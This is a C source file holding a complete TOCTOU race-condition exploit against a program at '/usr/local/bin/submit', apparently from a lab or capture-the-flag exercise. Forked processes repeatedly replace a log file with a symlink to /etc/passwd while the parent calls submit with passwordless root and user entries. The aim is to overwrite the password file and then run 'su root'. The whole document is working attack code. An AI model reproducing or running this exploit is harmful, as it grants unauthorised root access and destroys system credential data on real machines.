#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#define TARGET "/usr/local/bin/submit"

int main(int argc, char *argv[]) {
        int i,k,pid;
        char* cmd;
        system("touch fff.txt");
        cmd = "/usr/local/bin/submit fff.txt 'root::0:0::/root:/bin/bash\nuser::1000:1000::/home/user:/bin/sh\nhalt::0:1001::/:/sbin/halt\n'";
        for(i = 0; i < 10; i++){
                pid = fork();
                if(pid == 0){
                        for(k = 0; k < 30; k++){
                                remove("/home/user/submit.log");
                                symlink("/etc/passwd", "/home/user/submit.log");
                                usleep(1000 + rand() % 5000);
                        }
                        return 0;
                }else{
                        for(k = 0; k < 30; k++){
                                system(cmd);
                                remove("/home/user/submit.log");
                        }
                        waitpid(pid, NULL, 0);
                }
        }
        system("su root");
        return 1;
}